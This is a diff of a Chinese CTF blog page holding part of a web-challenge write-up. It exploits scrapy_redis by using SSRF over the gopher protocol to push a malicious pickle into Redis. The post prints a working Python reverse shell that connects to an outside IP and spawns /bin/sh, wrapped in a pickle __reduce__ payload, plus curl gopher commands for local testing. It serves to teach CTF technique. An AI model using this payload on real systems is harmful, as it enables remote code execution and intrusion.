@@ -336,4 +336,297 @@
 <p>在 <a target="_blank" rel="noopener" href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>python -c &quot;(lambda <span class="hljs-strong">__g: [<span class="hljs-string">[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;</span>] in [<span class="hljs-string">(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;</span>]))]][<span class="hljs-string">0</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>] for __</span>g[<span class="hljs-string">&#x27;s&#x27;</span>] in [<span class="hljs-string">(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;os&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;os&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for __</span>g[<span class="hljs-string">&#x27;subprocess&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;subprocess&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;socket&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;socket&#x27;, __g, __g))</span>]][0])(globals())&quot;</span><br><span class="hljs-strong"></span><br></code></pre></td></tr></table></figure>
 <p>将替换原 exp 中的 反弹 shell 脚本，得到脚本：（注意引号问题）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bi
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>最后需要看懂 poc 的 前半部分，就是下面这一小块：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.20.0.7:6379/_ZADD byte:requests 0 &quot;“</span><br><br></code></pre></td></tr></table></figure>
+<p>在此之前先去补充了一下 gopher 和 redis 的基本用法。并且题解中提到通过观察源码可以知道 scrapy_redis 它会将request对象存入爬虫名:requests这样的有序列表中。这里我有 2 个问题：</p>
+<ol>
+<li>使用 gopher 协议可以向 redis 插入数据？可以在本地进行测试。</li>
+<li>为什么在 result= 之后可以 SSRF？怎么进行测试？<br>使用下面的 url 在本地进行测试，确实可以获取到数据。<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># 插入键和值</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_set%<span class="hljs-number">20</span>runoobkey%<span class="hljs-number">20</span>redis<br><span class="hljs-comment"># 获取值</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_get%<span class="hljs-number">20</span>runoobkey<br><br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>通过前面读取源码，可以知道 host</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>     localhost<br>::<span class="hljs-number">1</span>           localhost ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span>       ip6-localnet<br>ff00::<span class="hljs-number">0</span>       ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span>       ip6-allnodes<br>ff02::<span class="hljs-number">2</span>       ip6-allrouters<br><span class="hljs-number">172.20</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>    <span class="hljs-number">914</span>c062c7588<br><br></code></pre></td></tr></table></figure>
+<p>整理一下所有 ip 的思路（只看后缀）</p>
+<ol>
+<li>setting.py 中有一个 .7 的 ip</li>
+<li>pipelines.py 中有一个 .8 的 ip</li>
+<li>host 中有 .5 的 ip<br>每个 ip 都对应一个 redis，参考这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> 可知，存在主从 redis。如何判断 主服务器的地址呢？为啥开始 exp 打 .7 的 ip 呢？</li>
+</ol>
+<p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p>
+<hr>
+<p>官方已经将环境关闭了，额，补不完了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020%E5%B9%B410%E6%9C%8831%E6%97%A5-PDFCreator%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PDFCreator题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020%E5%B9%B410%E6%9C%8817%E6%97%A5-N1CTF/">
+                        <span class="hidden-mobile">2020年10月N1CTF部分web题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-WTRCMZDFLE', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-WTRCMZDFLE');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
